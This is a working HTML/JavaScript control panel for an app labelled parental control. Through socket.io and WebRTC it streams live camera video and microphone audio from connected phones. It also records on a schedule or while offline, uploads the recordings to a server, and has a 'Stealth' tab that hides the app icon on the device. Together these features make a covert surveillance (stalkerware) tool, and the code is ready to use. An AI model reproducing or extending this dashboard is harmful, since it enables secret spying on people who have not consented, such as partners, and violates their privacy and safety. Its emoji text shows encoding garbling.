<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parental Control ‚Ä¢ Premium</title>
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <nav class="navbar">
        <div class="brand">
            <span>üõ°Ô∏è</span> Control Center
        </div>

        <div class="device-selector-wrapper" style="margin-left: 1rem;">
            <select id="deviceSelect" class="device-select" onchange="onDeviceSelected()">
                <option value="">Waiting for devices...</option>
            </select>
        </div>

        <div class="nav-tabs">
            <button class="tab-btn active" onclick="switchTab('monitor')">Monitor</button>
            <button class="tab-btn" onclick="switchTab('config')">Schedule & Config</button>
            <button class="tab-btn" onclick="switchTab('recordings')">Gallery</button>
            <button class="tab-btn" onclick="switchTab('settings')">Settings</button>
            <button class="tab-btn" onclick="switchTab('logs')">Logs</button>
        </div>
    </nav>

    <div id="toast-container" class="toast-container"></div>

    <div class="container">

        <!-- MONITOR TAB -->
        <div id="tab-monitor" class="section active">
            <div class="monitor-layout">
                <!-- Main Feed -->
                <div class="video-wrapper">
                    <video id="video-stream" autoplay playsinline muted></video>
                    <div id="video-overlay" class="video-status-overlay"></div>
                    <div
                        style="position: absolute; top: 1rem; right: 1rem; background: rgba(0,0,0,0.6); padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem;">
                        üî¥ LIVE
                    </div>
                </div>

                <!-- Quick Controls -->
                <div style="display: flex; flex-direction: column; gap: 1rem;">
                    <div class="card">
                        <h3>üìπ Video</h3>
                        <div class="button-grid">
                            <button onclick="startVideo()" class="primary">Start</button>
                            <button onclick="stopVideo()" class="danger">Stop</button>
                            <button onclick="switchVideo()">Switch Cam</button>
                            <button onclick="toggleFullscreen()">üî≥ Fullscreen</button>
                        </div>
                    </div>

                    <div class="card">
                        <h3>üéôÔ∏è Quick Controls</h3>
                        <div class="btn-row">
                            <button id="btn-audio" onclick="toggleAudio()">‚ñ∂Ô∏è Start Live Audio</button>
                        </div>
                        <div class="btn-row" style="margin-top: 0.5rem;">
                            <button id="btn-record" onclick="toggleManualRecording()" class="primary">üî¥ Start Manual
                                Recording</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- CONFIG TAB -->
        <div id="tab-config" class="section">
            <div class="dashboard-grid">
                <!-- Config Form -->
                <div class="card">
                    <h3>‚öôÔ∏è Device Configuration</h3>

                    <div class="toggle-row">
                        <label title="Keep recording audio even when device has no internet">Auto-Record Audio</label>
                        <input type="checkbox" id="audioEnabled">
                    </div>
                    <div class="toggle-row">
                        <label title="Keep recording video frames when device has no internet">Auto-Record Video</label>
                        <input type="checkbox" id="videoEnabled">
                    </div>

                    <details
                        style="margin-top: 1.5rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem;">
                        <summary
                            style="cursor: pointer; color: var(--accent-color); font-weight: 500; margin-bottom: 1rem; outline: none;">
                            Advanced Settings ‚ñæ</summary>

                        <div class="toggle-row">
                            <label title="Automatically switch to recording mode if internet connection drops">Offline
                                Mode (Network Loss)</label>
                            <input type="checkbox" id="offlineMode">
                        </div>

                        <div style="margin-top: 1rem;">
                            <label title="Maximum allowed space for recordings on the phone">Max Local Storage
                                (MB)</label>
                            <input type="number" id="maxStorageMb" placeholder="500">

                            <label title="How often the phone uploads recordings to the server">Cloud Sync Interval
                                (min)</label>
                            <input type="number" id="uploadInterval" placeholder="15">

                            <label title="How long each recording file should be">Save Frequency (sec)</label>
                            <input type="number" id="chunkDuration" placeholder="5">
                        </div>
                    </details>

                    <button onclick="updateConfig()" class="primary" style="width: 100%; margin-top: 1rem;">Save
                        Changes</button>
                </div>

                <!-- Schedule & Stats -->
                <div style="display: flex; flex-direction: column; gap: 1.5rem;">
                    <div class="card">
                        <h3>üìÖ Schedule</h3>
                        <div class="toggle-row">
                            <label>Enable Schedule</label>
                            <input type="checkbox" id="scheduleEnabled">
                        </div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
                            <div>
                                <label>Start</label>
                                <input type="time" id="scheduleStartTime">
                            </div>
                            <div>
                                <label>End</label>
                                <input type="time" id="scheduleEndTime">
                            </div>
                        </div>
                    </div>

                    <div class="card">
                        <h3>üìä Status</h3>
                        <div id="storageStats">
                            <p style="color: var(--text-secondary); text-align: center;">Loading stats...</p>
                        </div>
                        <div id="currentConfig"
                            style="margin-top: 1rem; font-size: 0.85rem; color: var(--text-secondary);"></div>

                        <div class="button-grid" style="margin-top: 1rem;">
                            <button onclick="getStorageStats()">Refresh Stats</button>
                            <button onclick="getConfig()">Refresh Config</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- RECORDINGS TAB -->
        <div id="tab-recordings" class="section">
            <div class="card">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                    <h3>‚òÅÔ∏è Offline Gallery</h3>
                    <button onclick="getRecordings()" class="primary">Refresh List</button>
                </div>
                <div id="recordingsList" style="max-height: 600px; overflow-y: auto;">
                    <p style="text-align: center; color: var(--text-secondary);">Click Refresh to load...</p>
                </div>
            </div>
        </div>

        <!-- SETTINGS TAB -->
        <div id="tab-settings" class="section">
            <div class="dashboard-grid">
                <div class="card">
                    <h3>üì∑ Camera Effects</h3>
                    <div class="button-grid">
                        <button onclick="toggleFlash()">Toggle Flash</button>
                        <button onclick="brightnessUp()">Brightness +</button>
                        <button onclick="brightnessDown()">Brightness -</button>
                    </div>
                </div>

                <div class="card">
                    <h3>üëÅÔ∏è Stealth</h3>
                    <div class="button-grid">
                        <button onclick="hideAppIcon()" class="danger">Hide Icon</button>
                        <button onclick="showAppIcon()">Show Icon</button>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.8rem; color: var(--danger);">
                        ‚ö†Ô∏è Hiding icon makes app invisible. Re-open via Settings > Apps.
                    </p>
                </div>
            </div>
        </div>

        <!-- LOGS TAB -->
        <div id="tab-logs" class="section">
            <div class="card">
                <h3>üìù System Logs</h3>
                <div id="logs"></div>
            </div>
        </div>

    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        // UI Logic
        function switchTab(id) {
            document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));

            document.getElementById('tab-' + id).classList.add('active');
            event.target.classList.add('active');
        }

        const socket = io({ query: { type: 'admin' } });
        const logsDiv = document.getElementById('logs');
        const videoElement = document.getElementById('video-stream');
        const videoOverlay = document.getElementById('video-overlay');
        const deviceSelect = document.getElementById('deviceSelect');

        let currentDeviceId = null;


        let audioCtx;
        let nextTime = 0;
        let peerConnection = null;
        const config = {
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        };

        function log(message) {
            const time = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.innerHTML = `<span style="opacity:0.5">[${time}]</span> ${message}`;
            logsDiv.appendChild(div);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        // Feedback Utilities
        function showToast(msg, type = 'info') {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `<span>${type === 'success' ? '‚úÖ' : type === 'error' ? '‚ùå' : '‚ÑπÔ∏è'}</span> ${msg}`;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.animation = 'fadeOut 0.3s forwards';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }

        function showVideoStatus(msg) {
            if (videoOverlay) {
                videoOverlay.innerText = msg;
                videoOverlay.classList.add('visible');
                setTimeout(() => videoOverlay.classList.remove('visible'), 2000);
            }
        }

        // Audio Control (Toggled)
        function toggleAudio() {
            const btn = document.getElementById('btn-audio');

            if (!isAudioRunning) {
                if (!currentDeviceId) return showToast("Select a device first!", "error");

                if (!audioCtx) {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
                }
                if (audioCtx.state === 'suspended') audioCtx.resume();

                socket.emit('start_monitoring', currentDeviceId);

                // Update UI
                isAudioRunning = true;
                btn.innerHTML = "‚èπÔ∏è Stop Live Audio";
                btn.classList.add('active-state');
                btn.classList.add('danger');
                showToast("Live Audio Started", "success");
            } else {
                if (!currentDeviceId) return;
                socket.emit('stop_monitoring', currentDeviceId);

                // Update UI
                isAudioRunning = false;
                btn.innerHTML = "‚ñ∂Ô∏è Start Live Audio";
                btn.classList.remove('active-state');
                btn.classList.remove('danger');
                showToast("Live Audio Stopped");
            }
        }

        // Manual Recording Control (Toggled)
        function toggleManualRecording() {
            const btn = document.getElementById('btn-record');

            if (!isRecording) {
                if (!currentDeviceId) return showToast("Select a device first!", "error");
                socket.emit('START_MANUAL_RECORDING', currentDeviceId);

                isRecording = true;
                btn.innerHTML = "‚èπÔ∏è Stop Recording";
                btn.classList.add('active-state');
                showToast("Recording Started on Device", "success");
            } else {
                if (!currentDeviceId) return;
                socket.emit('STOP_MANUAL_RECORDING', currentDeviceId);

                isRecording = false;
                btn.innerHTML = "üî¥ Start Manual Recording";
                btn.classList.remove('active-state');
                showToast("Recording Stopped");
            }
        }

        // Video Control with WebRTC
        async function startVideo() {
            try {
                if (peerConnection) peerConnection.close();
                peerConnection = new RTCPeerConnection(config);

                peerConnection.ontrack = (event) => {
                    log("üìπ Video track received");
                    let stream = event.streams && event.streams[0];
                    if (!stream) {
                        stream = new MediaStream();
                        stream.addTrack(event.track);
                    }
                    videoElement.srcObject = stream;
                    videoElement.play().catch(e => log(`‚ö†Ô∏è Autoplay failed: ${e.message}`));
                };

                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        socket.emit('webrtc_ice_candidate', JSON.stringify({
                            sdpMid: event.candidate.sdpMid,
                            sdpMLineIndex: event.candidate.sdpMLineIndex,
                            candidate: event.candidate.candidate
                        }));
                    }
                };

                peerConnection.onconnectionstatechange = () => {
                    log(`üîó Connection state: ${peerConnection.connectionState}`);
                };

                log("‚è≥ Requesting camera...");
                if (!currentDeviceId) return alert("Select a device!");
                socket.emit('start_video', currentDeviceId);

                // Wait for confirmation logic simplified for brevity/robustness
                // (Using simple timeout/wait logic if needed, but here preserving simple flow)

                await new Promise(r => setTimeout(r, 1000)); // Small delay for service start

                const offer = await peerConnection.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
                await peerConnection.setLocalDescription(offer);

                socket.emit('webrtc_offer', JSON.stringify({
                    targetId: currentDeviceId,
                    offer: { type: offer.type, sdp: offer.sdp }
                }));

                isVideoRunning = true;
                showVideoStatus("CAMERA STARTED");
                showToast("Camera connection initiated...", "success");

            } catch (error) {
                log(`‚ùå Error: ${error.message}`);
                console.error(error);
            }
        }

        function stopVideo() {
            if (!currentDeviceId) return;
            socket.emit('stop_video', currentDeviceId);
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
            if (videoElement.srcObject) {
                videoElement.srcObject.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
            }
            isVideoRunning = false;
            showVideoStatus("CAMERA STOPPED");
            showToast("Camera stopped");
        }

        function switchVideo() {
            if (!currentDeviceId) return;
            socket.emit('switch_camera', currentDeviceId);
            showVideoStatus("SWITCHING CAMERA...");
            showToast("Switching camera...");
        }

        function toggleFlash() {
            if (currentDeviceId) {
                socket.emit('toggle_flash', currentDeviceId);
                showVideoStatus("FLASH TOGGLED");
                showToast("Flash toggle sent");
            }
        }

        function brightnessUp() {
            if (currentDeviceId) {
                socket.emit('brightness_up', currentDeviceId);
                showVideoStatus("BRIGHTNESS +");
            }
        }

        function brightnessDown() {
            if (currentDeviceId) {
                socket.emit('brightness_down', currentDeviceId);
                showVideoStatus("BRIGHTNESS -");
            }
        }

        function hideAppIcon() {
            if (confirm("Hide app icon?") && currentDeviceId) {
                socket.emit('hide_app_icon', currentDeviceId);
                showToast("Hide Icon command sent", "success");
            }
        }

        function toggleFullscreen() {
            const video = document.getElementById('video-stream');
            if (!document.fullscreenElement) {
                video.requestFullscreen().catch(err => {
                    log(`Error attempting fullscreen: ${err.message}`);
                });
            } else {
                document.exitFullscreen();
            }
        }
        function showAppIcon() { if (currentDeviceId) socket.emit('show_app_icon', currentDeviceId); }

        function updateConfig() {
            const config = {
                maxStorageMb: parseInt(document.getElementById('maxStorageMb').value) || 500,
                uploadIntervalMinutes: parseInt(document.getElementById('uploadInterval').value) || 15,
                audioEnabled: document.getElementById('audioEnabled').checked,
                videoEnabled: document.getElementById('videoEnabled').checked,
                offlineModeEnabled: document.getElementById('offlineMode').checked,
                offlineChunkDurationSeconds: parseInt(document.getElementById('chunkDuration').value) || 5,
                scheduleStartTime: document.getElementById('scheduleStartTime').value,
                scheduleEndTime: document.getElementById('scheduleEndTime').value,
                scheduleEnabled: document.getElementById('scheduleEnabled').checked
            };
            if (!currentDeviceId) return alert("Select a device!");
            socket.emit('update_config', { targetId: currentDeviceId, config: config });
            showToast("Configuration saved to device", "success");
        }

        function getConfig() { if (currentDeviceId) socket.emit('get_config', currentDeviceId); }
        function getStorageStats() { if (currentDeviceId) socket.emit('get_storage_stats', currentDeviceId); }

        socket.on('current_config', (config) => {
            try {
                const cfg = JSON.parse(config);
                // Populate Inputs
                if (document.getElementById('maxStorageMb')) document.getElementById('maxStorageMb').value = cfg.maxStorageMb;
                if (document.getElementById('uploadInterval')) document.getElementById('uploadInterval').value = cfg.uploadIntervalMinutes;
                if (document.getElementById('audioEnabled')) document.getElementById('audioEnabled').checked = cfg.audioEnabled;
                if (document.getElementById('videoEnabled')) document.getElementById('videoEnabled').checked = cfg.videoEnabled;
                if (document.getElementById('offlineMode')) document.getElementById('offlineMode').checked = cfg.offlineModeEnabled;
                if (document.getElementById('chunkDuration')) document.getElementById('chunkDuration').value = cfg.offlineChunkDurationSeconds;
                if (document.getElementById('scheduleStartTime')) document.getElementById('scheduleStartTime').value = cfg.scheduleStartTime || "09:00";
                if (document.getElementById('scheduleEndTime')) document.getElementById('scheduleEndTime').value = cfg.scheduleEndTime || "17:00";
                if (document.getElementById('scheduleEnabled')) document.getElementById('scheduleEnabled').checked = cfg.scheduleEnabled;

                // Update Status Text
                document.getElementById('currentConfig').innerHTML = `
                    Last Sync: ${new Date().toLocaleTimeString()}<br>
                    Mode: ${cfg.offlineModeEnabled ? 'Offline Ready' : 'Online Only'} | Limits: ${cfg.maxStorageMb}MB
                `;
            } catch (e) { log("‚ùå parse error"); }
        });

        socket.on('storage_stats', (stats) => {
            try {
                const s = JSON.parse(stats);
                document.getElementById('storageStats').innerHTML = `
                    <div style="font-size: 1.25rem; font-weight: bold;">${s.percentUsed}% Full</div>
                    <div style="width:100%; height:8px; background:rgba(255,255,255,0.1); border-radius:4px; margin: 0.5rem 0;">
                        <div style="width:${s.percentUsed}%; height:100%; background:var(--accent-color); border-radius:4px;"></div>
                    </div>
                    <div>Audio: ${s.audioFiles} | Video: ${s.videoFiles}</div>
                `;
            } catch (e) { }
        });

        // WebRTC Handlers
        socket.on('webrtc_answer', async (a) => {
            try { await peerConnection.setRemoteDescription(new RTCSessionDescription(JSON.parse(a))); } catch (e) { console.error(e); }
        });
        socket.on('webrtc_ice_candidate', async (c) => {
            try { await peerConnection.addIceCandidate(new RTCIceCandidate(JSON.parse(c))); } catch (e) { console.error(e); }
        });

        // Audio Recording
        let isRecordingLive = false;
        let recordedChunks = [];

        function toggleLiveRecording() {
            if (!isRecordingLive) {
                isRecordingLive = true;
                recordedChunks = [];
                const btn = document.getElementById('recordBtn');
                btn.innerText = "‚èπÔ∏è Stop";
                btn.classList.add('danger');
                log("üî¥ Recording...");
            } else {
                stopLiveRecording();
            }
        }

        function stopLiveRecording() {
            isRecordingLive = false;
            const btn = document.getElementById('recordBtn');
            btn.innerText = "üî¥ Record Live";
            btn.classList.remove('danger');
            log("üíæ Saving...");
            saveWavFile();
        }

        function saveWavFile() {
            if (recordedChunks.length === 0) return;
            let totalLen = 0;
            for (let chunk of recordedChunks) totalLen += chunk.length;
            const wavBuffer = new Int16Array(totalLen + 22);
            const view = new DataView(wavBuffer.buffer);

            writeString(view, 0, 'RIFF');
            view.setUint32(4, 36 + totalLen * 2, true);
            writeString(view, 8, 'WAVE');
            writeString(view, 12, 'fmt ');
            view.setUint32(16, 16, true);
            view.setUint16(20, 1, true);
            view.setUint16(22, 1, true);
            view.setUint32(24, 44100, true);
            view.setUint32(28, 44100 * 2, true);
            view.setUint16(32, 2, true);
            view.setUint16(34, 16, true);
            writeString(view, 36, 'data');
            view.setUint32(40, totalLen * 2, true);

            let int16Offset = 22;
            for (let chunk of recordedChunks) {
                wavBuffer.set(chunk, int16Offset);
                int16Offset += chunk.length;
            }

            const blob = new Blob([view], { type: 'audio/wav' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `rec_${new Date().getTime()}.wav`;
            a.click();
        }

        function writeString(view, offset, string) {
            for (let i = 0; i < string.length; i++) view.setUint8(offset + i, string.charCodeAt(i));
        }

        socket.on('audio_data', (payload) => {
            // payload = { deviceId, data }
            // Only play if it matches selected device
            if (payload.deviceId !== currentDeviceId) return;
            const buf = payload.data;

            if (!audioCtx) return;
            const int16 = new Int16Array(buf);
            if (isRecordingLive) recordedChunks.push(new Int16Array(int16));

            const float32 = new Float32Array(int16.length);
            for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;

            const b = audioCtx.createBuffer(1, float32.length, 44100);
            b.getChannelData(0).set(float32);
            const s = audioCtx.createBufferSource();
            s.buffer = b;
            s.connect(audioCtx.destination);
            if (nextTime < audioCtx.currentTime) nextTime = audioCtx.currentTime;
            s.start(nextTime);
            nextTime += b.duration;
        });

        // Offline Recordings
        function getRecordings() { socket.emit('get_recordings_list'); }
        function deleteRecording(name) { if (confirm('Delete?')) socket.emit('delete_recording', name); }

        socket.on('recordings_list', (files) => {
            const list = document.getElementById('recordingsList');
            if (files.length === 0) { list.innerHTML = '<p>No recordings.</p>'; return; }
            let html = '<table><thead><tr><th>Date</th><th>Size</th><th>Action</th></tr></thead><tbody>';
            files.forEach(f => {
                html += `<tr>
                    <td>${new Date(f.date).toLocaleString()}</td>
                    <td>${(f.size / 1024).toFixed(1)} KB</td>
                    <td><a href="/uploads/${f.name}" target="_blank" style="color:var(--accent-color)">Download</a> 
                        <span onclick="deleteRecording('${f.name}')" style="cursor:pointer; margin-left:10px;">‚ùå</span>
                    </td></tr>`;
            });
            list.innerHTML = html + '</tbody></table>';
        });

        socket.on('new_recording', () => { log("‚ú® New recording"); getRecordings(); });
        socket.on('recording_deleted', () => { log("üóëÔ∏è Deleted"); getRecordings(); });
        socket.on('log', (msg) => log(msg));
        socket.on('server_log', (msg) => log(msg));

        // Device List Management
        socket.on('device_list_update', (list) => {
            // list = [[id, {name, socketId}], ...]
            const oldVal = deviceSelect.value;
            deviceSelect.innerHTML = '<option value="">-- Select Device --</option>';

            if (list.length === 0) {
                deviceSelect.innerHTML = '<option value="">No devices connected</option>';
            }

            list.forEach(([id, info]) => {
                const opt = document.createElement('option');
                opt.value = id;
                opt.text = `${info.name} (${id.substr(0, 4)}...)`;
                deviceSelect.appendChild(opt);
            });

            // Try to restore selection
            if (oldVal && list.find(([id]) => id === oldVal)) {
                deviceSelect.value = oldVal;
            } else if (list.length > 0 && !currentDeviceId) {
                // Auto-select first if none selected
                deviceSelect.value = list[0][0];
                onDeviceSelected();
            }
        });

        function onDeviceSelected() {
            currentDeviceId = deviceSelect.value;
            if (currentDeviceId) {
                showToast("Switched to device: " + currentDeviceId, "info");
                // Refresh data for new device
                getConfig();
                getStorageStats();
            }
        }

        // Init
        // getConfig(); // Wait for device selection
        // getStorageStats();
        // Load recordings initially for better UX? No, wait for user or just call it.
        // getRecordings(); 
    </script>
</body>

</html>